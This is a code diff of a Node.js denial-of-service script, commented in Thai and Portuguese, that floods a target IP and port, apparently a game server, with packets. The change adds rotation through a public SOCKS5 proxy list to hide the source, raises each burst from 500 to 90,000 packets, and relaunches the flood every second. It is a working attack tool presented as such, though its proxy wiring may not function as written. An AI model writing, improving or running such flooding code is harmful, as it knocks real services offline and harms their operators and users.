@@ -1,4 +1,5 @@
 const axios = require('axios');
+const { SocksProxyAgent } = require('socks-proxy-agent');
 const net = require('net');
 
 // ตั้งค่า IP และพอร์ตจากอาร์กิวเมนต์
@@ -28,41 +29,59 @@ const packets = [
 
 console.log(`Ataque iniciado no ip: ${orgip} e Porta: ${port}`);
 
-// ฟังก์ชันสำหรับส่งแพ็กเก็ต
-async function sendPackets() {
-    const socket = net.createConnection({ host: ip, port: port });
+// ดาวน์โหลด proxy list
+async function getProxies() {
+    const response = await axios.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt');
+    return response.data.split('\n').filter(Boolean);
+}
 
-    socket.on('connect', () => {
-        for (let i = 0; i < 500; i++) { // ส่ง 500 แพ็กเก็ตในแต่ละครั้ง
-            const msg = packets[Math.floor(Math.random() * packets.length)];
-            socket.write(msg);
+// ฟังก์ชันสำหรับส่งแพ็กเก็ตผ่าน proxy
+async function sendPackets(proxy) {
+    try {
+        const agent = new SocksProxyAgent(`socks5://${proxy}`);
+        const options = {
+            host: ip,
+            port: port,
+            agent: agent
+        };
 
-            // ส่ง cookie ขึ้นอยู่กับ port ที่กำหนด
-            if (port == 7777) {
-                socket.write(packets[5]);
-            } else if (port == 7796) {
-                socket.write(packets[4]);
-            } else if (port == 7771) {
-                socket.write(packets[6]);
-            } else if (port == 7784) {
-                socket.write(packets[7]);
-            } else if (port == 1111) {
-                socket.write(packets[9]);
+        const socket = net.connect(options, () => {
+            for (let i = 0; i < 90000; i++) {
+                const msg = packets[Math.floor(Math.random() * packets.length)];
+                socket.write(msg);
+
+                if (port == 7777) {
+                    socket.write(packets[5]);
+                } else if (port == 7796) {
+                    socket.write(packets[4]);
+                } else if (port == 7771) {
+                    socket.write(packets[6]);
+                } else if (port == 7784) {
+                    socket.write(packets[7]);
+                } else if (port == 1111) {
+                    socket.write(packets[9]);
+                }
             }
-        }
-        socket.end(); // ปิดการเชื่อมต่อ
-    });
+            socket.end(); // ปิดการเชื่อมต่อทันทีหลังจากส่งแพ็กเก็ตเสร็จ
+        });
 
-    socket.on('error', (err) => {
-        console.error(`Error: ${err.message}`);
-    });
+        socket.on('error', (err) => {
+            console.error(`Error with proxy ${proxy}: ${err.message}`);
+        });
+
+    } catch (error) {
+        console.error(`Failed to connect through proxy ${proxy}: ${error.message}`);
+    }
 }
 
 // ฟังก์ชันหลัก
 async function startAttack() {
-    for (let i = 0; i < 100000; i++) { // ส่ง 30,000 requests
-        sendPackets();
-    }
+    const proxies = await getProxies();
+    setInterval(() => {
+        proxies.forEach(proxy => {
+            sendPackets(proxy);
+        });
+    }, 1000); // ส่ง request ทุก 1 วินาที
 }
 
 // เริ่มการทำงาน
